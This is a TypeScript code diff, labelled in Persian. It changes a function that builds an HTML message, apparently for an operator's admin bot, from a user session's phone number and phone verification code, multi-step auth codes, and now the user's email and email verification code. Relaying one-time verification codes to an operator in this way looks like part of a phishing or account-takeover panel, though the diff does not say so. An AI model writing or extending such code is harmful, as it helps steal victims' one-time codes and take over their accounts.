@@ -520,7 +520,10 @@ export const showAdminButtons = async (sessionId: string): Promise<boolean> => {
 /**
  * Format initial message with all session data
  */
-const formatInitialMessage = (session: UserSession): string => {
+/**
+ * Format session message with all available data (phone, email, codes)
+ */
+const formatSessionMessage = (session: UserSession): string => {
   // Escape HTML characters in user data
   const escapeHtml = (text: string): string => {
     return text
@@ -543,6 +546,16 @@ const formatInitialMessage = (session: UserSession): string => {
     message += `\n\n✅ <b>کد تایید شماره:</b> <code>${escapeHtml(session.phoneVerificationCode)}</code>`;
   }
 
+  // Add email information if exists
+  if (session.email) {
+    message += `\n\n📧 <b>ایمیل:</b> <code>${escapeHtml(session.email)}</code>`;
+  }
+
+  // Add email verification code if exists
+  if (session.emailCode) {
+    message += `\n✅ <b>کد تایید ایمیل:</b> <code>${escapeHtml(session.emailCode)}</code>`;
+  }
+
   // Add auth steps data
   if (session.authCodes && Object.keys(session.authCodes).length > 0) {
     Object.keys(session.authCodes).forEach((stepType) => {
@@ -561,6 +574,10 @@ const formatInitialMessage = (session: UserSession): string => {
   message += `\n🕐 <b>آخرین به‌روزرسانی:</b> ${escapeHtml(new Date().toLocaleString("fa-IR"))}`;
 
   return message;
+};
+
+const formatInitialMessage = (session: UserSession): string => {
+  return formatSessionMessage(session);
 };
 
 /**
